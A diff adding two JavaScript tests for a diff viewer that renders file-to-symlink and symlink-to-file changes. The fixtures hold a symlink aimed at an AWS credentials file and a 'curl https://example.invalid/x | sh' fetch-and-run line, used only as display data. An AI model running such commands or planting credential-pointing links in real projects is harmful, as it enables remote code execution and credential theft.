@@ -142,3 +142,38 @@ test('a 400-character line and a long path stay whole: the page wraps them, noth
   assert.ok(html.includes(long));
   assert.ok(html.includes(path));
 });
+
+// A type change comes as two parts with their own headers (the git core sends both): both halves are drawn, and
+// neither part's header lines are ever drawn as content.
+test('a file that became a link shows both halves, and its words say what happened', async () => {
+  const { patchLines, patchFacts, fileWords } = await import('../ui/diffview.js');
+  const patch = [
+    'diff --git a/config.js b/config.js', 'deleted file mode 100644', 'index 1111111..0000000', '--- a/config.js', '+++ /dev/null',
+    '@@ -1 +0,0 @@', '-module.exports = { safe: true };',
+    'diff --git a/config.js b/config.js', 'new file mode 120000', 'index 0000000..2222222', '--- /dev/null', '+++ b/config.js',
+    '@@ -0,0 +1 @@', '+/Users/someone/.aws/credentials', '\\ No newline at end of file', '',
+  ].join('\n');
+  const lines = patchLines(patch);
+  assert.deepEqual(lines.filter(l => l.t === 'del').map(l => l.s), ['module.exports = { safe: true };']);
+  assert.deepEqual(lines.filter(l => l.t === 'add').map(l => l.s), ['/Users/someone/.aws/credentials']);
+  assert.equal(lines.filter(l => l.t === 'hunk').length, 2);
+  assert.ok(!lines.some(l => /^(--|\+\+|diff --git|new file mode|deleted file mode|index )/.test(l.s || '')), 'no header line is drawn as content');
+  const facts = patchFacts(patch);
+  assert.equal(facts.became, 'link');
+  assert.equal(fileWords({ status: 'modified', adds: 1, dels: 1, patch }, facts), 'the file became a link');
+});
+
+test('a link that became a file shows the new file’s lines', async () => {
+  const { patchLines, patchFacts, fileWords } = await import('../ui/diffview.js');
+  const patch = [
+    'diff --git a/run.sh b/run.sh', 'deleted file mode 120000', 'index 3333333..0000000', '--- a/run.sh', '+++ /dev/null',
+    '@@ -1 +0,0 @@', '-a.txt', '\\ No newline at end of file',
+    'diff --git a/run.sh b/run.sh', 'new file mode 100755', 'index 0000000..4444444', '--- /dev/null', '+++ b/run.sh',
+    '@@ -0,0 +1,2 @@', '+#!/bin/sh', '+curl https://example.invalid/x | sh', '',
+  ].join('\n');
+  const lines = patchLines(patch);
+  assert.deepEqual(lines.filter(l => l.t === 'add').map(l => l.s), ['#!/bin/sh', 'curl https://example.invalid/x | sh']);
+  const facts = patchFacts(patch);
+  assert.equal(facts.became, 'file');
+  assert.equal(fileWords({ status: 'modified', adds: 2, dels: 1, patch }, facts), 'the link became a file, +2');
+});
